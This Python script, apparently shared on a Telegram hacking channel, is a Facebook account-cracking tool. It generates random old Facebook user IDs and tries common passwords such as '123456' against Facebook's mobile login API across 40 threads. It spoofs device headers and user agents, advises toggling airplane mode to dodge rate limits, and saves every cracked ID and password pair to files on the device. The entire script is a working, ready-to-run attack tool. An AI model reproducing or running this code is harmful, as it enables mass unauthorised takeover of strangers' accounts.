#======= SC SEND BY > KALYAN king

#======== TG : KGF_TEAM_CYBER

#======== CHANEL LINK :./ : https://t.me/KGF_TEAM_CYBER
#▬▭▬▭▬▭▬▭[IMPORT]▬▭▬▭▬▭▬▭#
import uuid,base64,os,hashlib,zlib,subprocess,time,platform,requests,mechanize
import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib,marshal,zlib,base64
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
import _socket, ssl, certifi
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from string import digits as digits
from random import randint as rr
from random import choice as rc
from io import BytesIO
import datetime
from urllib.parse import urlencode
import pycurl

BASE_DIR = "/data/data/com.termux/files/home/storage/shared/PARADISE"
os.makedirs(BASE_DIR, exist_ok=True)

# ==========================
def save_clone(uid, pw):
    # Ambil tanggal hari ini
    today = datetime.now().strftime("%Y-%m-%d")

    # Buat nama file dengan tambahan tanggal
    clone_filename = f"TAREK-OLD-KGF_{today}.txt"
    clone_path = os.path.join(BASE_DIR, clone_filename)

    # Simpan data ke file
    with open(clone_path, "a") as f:
        f.write(f"{uid}|{pw}\n")

#▬▭▬▭▬▭▬▭[COLOR CODE]▬▭▬▭▬▭▬▭#
white= "\x1b[1;97m";yelloww="\033[1;33m";green = "\x1b[38;5;49m";G0 = "\x1b[38;5;155m";green1 = '\x1b[38;5;154m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';G6 = "\x1b[38;5;52m";s = "\033[0m";W = "\033[1;30m";Y = "\x1b[1;93m";red = "\x1b[38;5;160m";B = "\033[1;95m";BE = "\x1b[1;35m";X = "\x1b[1;96m";Z = "\x1b[1;95m";Y = "\033[1;93m";U = "\033[1;94m";V = "\033[38;5;47m";T = "\033[38;5;48m";Q = "\033[38;5;49m";P = "\033[38;5;50m";O = "\033[38;5;51m";N = "\033[38;5;52m";M = "\x1b[38;5;205m";L = "\033[96;1m";K = "\x1b[1;91m";WH = "\033[1;97m";orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";rad="\x1b[38;5;160m";YLW="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
style=f"{white}[{red}●{white}]"
#▬▭▬▭▬▭▬▭[PERMISSION OF SDCARD]▬▭▬▭▬▭▬▭#
try:
    os.system('rm -'+'rf /sd'+'card/.txt');os.system('clear');open('/sd'+'ca'+'rd/.t'+'xt','w').write(' ')
except PermissionError:
    os.system("clear")
    print(f"{style} {green}MR-TAREK TOOL IS NOT ALLOW WITHOUT STORAGE PERMISSION");os.system('termux-setup-storage');os.system('clear');exit(f"{green} RUN AGAIN 👉 python TAREK-OLD.py")
#▬▭▬▭▬▭▬▭[SECURITY BOX]▬▭▬▭▬▭▬▭#

#▬▭▬▭▬▭▬▭[PYCURL]▬▭▬▭▬▭▬▭#
def py_curl(url):
    curl = pycurl.Curl()
    buffer = BytesIO()
    try:
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.SSL_VERIFYPEER, 1)
        curl.setopt(curl.SSL_VERIFYHOST, 2)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
    except pycurl.error as e:
        return f"An error in py{e}"
    finally:
        curl.close()
    response_body = buffer.getvalue().decode('utf-8')
    return response_body
#▬▭▬▭▬▭▬▭[LOADING SYSTEM]▬▭▬▭▬▭▬▭#
def tarek(z):
      for a in z +'\n':sys.stdout.write(a);sys.stdout.flush();time.sleep(0.050)
#▬▭▬▭▬▭▬▭[OPENING MOMENT]▬▭▬▭▬▭▬▭#
print(f'{style}{green} Checking Update...{white}');time.sleep(2)
os.system("git pull");time.sleep(2);os.system("clear")
#▬▭▬▭▬▭▬▭[MODULE]▬▭▬▭▬▭▬▭#
try:import pystyle
except ImportError:print(f"{style} {green}installing pystyle...{white}");time.sleep(0.5);os.system('pip install pystyle');import pystyle;os.system('clear')
from pystyle import Colors, Colorate
#▬▭▬▭▬▭▬▭[USER AGENT]▬▭▬▭▬▭▬▭#
def tarek_ua():
    ver=str(random.choice(range(77,500)))
    ver2=str(random.choice(range(57,77)))
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36"

def tarek_ua1():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
#▬▭▬▭▬▭▬▭[SPECIAL LINE]▬▭▬▭▬▭▬▭#
def linex():
    #print(Colorate.Horizontal(Colors.green_to_white, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
    print(f"{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#▬▭▬▭▬▭▬▭[TOOL STATUS]▬▭▬▭▬▭▬▭#
try:
    statuss='FREE'
except Exception as e:print(f'{green} An error occurred: {e}');sys.exit()
status = statuss.strip()
#▬▭▬▭▬▭▬▭[TOOL VERSION]▬▭▬▭▬▭▬▭#
try:
    versionn = '0.1'
except Exception as e:print(f'{green} An error occurred: {e}');sys.exit()
version = versionn.strip()
#▬▭▬▭▬▭▬▭[BANNER]▬▭▬▭▬▭▬▭#
logo=(Colorate.Horizontal(Colors.green_to_white, """╔═╗╦  ╦╗  ╦ ╦╗  ╔═╗╦  ╔═╗╔╗╔╔═╗
║ ║║  ║║  ║ ║║  ║  ║  ║ ║║║║║╣ 
╚═╝╩═╝╩╝  ╩ ╩╝  ╚═╝╩═╝╚═╝╝╚╝╚═╝"""" MR-TAREK"))
info=(f"""{style}{green} SC SEND   {white}➤ {green} KALYAN KING
{style}{green} FACEBOOK {white}➤ {green}MD TAREK HOSSEN
{style}{green} STATUS   {white}➤ {green}{status}
{style}{green} VERSION  {white}➤ {green}{versionn}""")
def main_logo():
    os.system("xdg-open https://t.me/KGF_TEAM_CYBER");os.system("xdg-open https://t.me/KGF_TEAM_CYBER");os.system("clear");print(logo);linex();print(info);linex()
#▬▭▬▭▬▭▬▭[LOOP]▬▭▬▭▬▭▬▭#
oks,loop,ua,ussr,tw,cps=[],0,[],[],[],[]
#▬▭▬▭▬▭▬▭[MAIN MENU]▬▭▬▭▬▭▬▭#
def main():
    main_logo()
    print(f'{white}[{red}A{white}]{green} START 2010-2011 CLONE')
    print(f'{white}[{red}B{white}]{green} START 2009-2010 CLONE')
    print(f'{white}[{red}C{white}]{green} START 2011-2014 CLONE')
    print(f'{white}[{red}O{white}]{green} EXIT THIS PROGRAM')
    linex()
    year_select=input(f'{white}[{red}?{white}] {green}SELECT {white}▶︎ {green}')
    if year_select in ['A','a','01','1']:old_2010_2011()
    elif year_select in ['B','b','02','2']:old_2009_2010()
    elif year_select in ['c','C','03','3']:old_2011_2014()
    elif year_select in ['O','o','00','0']:os.system("exit")
    else:main()
#▬▭▬▭▬▭▬▭[OLD MENU]▬▭▬▭▬▭▬▭#
def old_2010_2011():
    user=[]
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 10000 20000 50000 99999');linex()
    limit=int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    clone_system="2010-2011"
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y}-{red}[{white}M1{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y}-{red}[{white}M2{red}]')
    linex()
    method=input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    for i in range(limit):
        data=random.choice(["100001","100002","100003","100004"])+str(random.choice(range(111111111,999999999)));user.append(data)
    tl=str(len(user))
    with ThreadPool(max_workers=40) as mr_tarek:
        main_logo()
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {str(len(user))}'+f'{red} ┼{green} SERVER{cyan} »{white} {clone_system}');print(f'{style}{green} ID LOGIN APTER 3 DAYS FOR GOOD RESULT')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for mal in user:
            uid=mal
            if method in ["01","1","A","a"]:mr_tarek.submit(_method_A_,uid,user)
            elif method in ["02","2","B","b"]:mr_tarek.submit(_method_B_,uid,user)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}");linex();exit()
#▬▭▬▭▬▭▬▭[OLD MENU]▬▭▬▭▬▭▬▭#
def old_2009_2010():
    user=[]
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 10000 20000 50000 99999');linex()
    limit=int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    year_code="100000";clone_system="2009-2010"
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y}-{red}[{white}M1{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y}-{red}[{white}M2{red}]')
    linex()
    method=input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    for i in range(limit):
        data=''.join(random.choice(digits) for i in range(9));user.append(data)
    tl=str(len(user))
    with ThreadPool(max_workers=40) as mr_tarek:
        main_logo()
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {str(len(user))}'+f'{red} ┼{green} SERVER{cyan} »{white} {clone_system}');print(f'{style}{green} ID LOGIN AFTER 3 DAYS FOR GOOD RESULT')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for mal in user:
            uid=year_code+mal
            if method in ["01","1","A","a"]:mr_tarek.submit(_method_A_,uid,user)
            elif method in ["02","2","B","b"]:mr_tarek.submit(_method_B_,uid,user)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}");linex();exit()
#▬▭▬▭▬▭▬▭[OLD MENU]▬▭▬▭▬▭▬▭#
def old_2011_2014():
    user=[]
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 10000 20000 50000 99999');linex()
    limit=int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    year_code="10000";clone_system="2011-2014"
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y}-{red}[{white}M1{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y}-{red}[{white}M2{red}]')
    linex()
    method=input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    for i in range(limit):
        data=''.join(random.choice(digits) for i in range(10));user.append(data)
    tl=str(len(user))
    with ThreadPool(max_workers=40) as mr_tarek:
        main_logo()
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {str(len(user))}'+f'{red} ┼{green} SERVER{cyan} »{white} {clone_system}');print(f'{style}{green} ID LOGIN AFTER 3 DAYS FOR GOOD RESULT')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for mal in user:
            uid=year_code+mal
            if method in ["01","1","A","a"]:mr_tarek.submit(_method_A_,uid,user)
            elif method in ["02","2","B","b"]:mr_tarek.submit(_method_B_,uid,user)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}");linex();exit()
#▬▭▬▭▬▭▬▭[METHOD 1]▬▭▬▭▬▭▬▭#
def _method_A_(uid,user):
    global oks,loop 
    agent=tarek_ua1()
    try:
        sys.stdout.write(f'\r\r{rad}[{green}FINDING-M1{rad}]{white}~{rad}[\x1b[1;97m{loop}{rad}]{white}~{rad}[{green1}CREAKED{white}•{green}{len(oks)}{rad}]');sys.stdout.flush()       
        for pw in ["123456","1234567","12345678","123456789","123123"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000, 29999999)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": agent,
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            mtd_A=requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in mtd_A:
                oks.append(uid)
                print(f"\r\r{red}[{green1}SUCCESS{red}] {green}{uid} {red}»{green} {pw}")
                open("/sdcard/MR-TAREK-OLD-M1-OK.txt","a").write(uid+"|"+pw+"\n")
                break 
            elif "Please Confirm Email" in str(mtd_A):
                oks.append(uid)
                print(f"\r\r{red}[{green1}SUCCESS{red}] {green}{uid} {red}»{green} {pw}")
                open("/sdcard/MR-TAREK-OLD-M1-OKK.txt","a").write(uid+"|"+pw+"\n")
                break
            else:pass
        loop+=1
    except Exception as e:
        time.sleep(5)
#▬▭▬▭▬▭▬▭[METHOD 2]▬▭▬▭▬▭▬▭#
def _method_B_(uid,user):
    global oks,loop 
    Session=requests.session();agent=tarek_ua1()
    try:
        sys.stdout.write(f'\r\r{rad}[{green}FINDING{white}-{green}M2{rad}]{white}~{rad}[\x1b[1;97m{loop}{rad}]{white}~{rad}[{green1}CREAKED{white}•{green}{len(oks)}{rad}]');sys.stdout.flush()       
        for pw in ["123456","1234567","12345678","123456789","123123"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000, 29999999)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": agent,
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            url=("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true")
            response=Session.get(url,headers=headers)
            mtd_B=response.json() if response.status_code == 200 else {}
            if "session_key" in mtd_B:
                oks.append(uid)
                print(f"\r\r{red}[{green1}SUCCESS{red}] {green}{uid} {red}»{green} {pw}")
                save_clone(uid, pw)
                break 
            elif "Please Confirm Email" in str(mtd_B):
                oks.append(uid)
                print(f"\r\r{red}[{green1}SUCCESS{red}] {green}{uid} {red}»{green} {pw}")
                save_clone(uid, pw)
                break
            else:pass
        loop+=1
    except Exception as e:
        time.sleep(5)
#▬▭▬▭▬▭▬▭[ENDED]▬▭▬▭▬▭▬▭#
main()
